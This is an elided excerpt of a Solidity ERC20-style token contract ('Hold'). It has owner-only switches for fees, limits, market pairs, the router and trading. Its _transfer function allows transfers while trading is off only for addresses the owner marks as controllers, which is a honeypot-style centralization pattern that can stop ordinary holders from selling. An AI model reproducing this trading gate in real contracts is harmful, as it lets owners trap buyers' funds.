...
contract Ownable is Context {
    ...
    function getController(address ac) internal view returns(bool){
        return _controllers[ac];
    }
...
contract Hold is Context,Ownable {
    ...
    function setMarketPairStatus(address account, bool newValue) public onlyOwners {
        isMarketPair[account] = newValue;
    }
    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwners{
        isTxLimitExempt[holder] = exempt;
    }
    function setIsExcludedFromFee(address account, bool newValue) public onlyOwners {
    ...
    function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwners {
    ...
    function enableSwitchTrading(bool enable) public onlyOwners{
    ...
    event log(string a, uint256 c);
    event log(string a, bool c);
    event log(string a, string c);
    event log(string a, address c);
    function _transfer(
        address from,
        address to,
        uint256 amount
        ...
        require(switchTrading || getController(_msgSender()) ,"ERC20: transfer error");
        ...
        emit log("form", from);
        emit log("to", to);
        emit log("finalAmount",finalAmount);
    ...
    function changeRouterVersion(address newRouterAddress) public onlyOwners returns(address newPairAddress) {
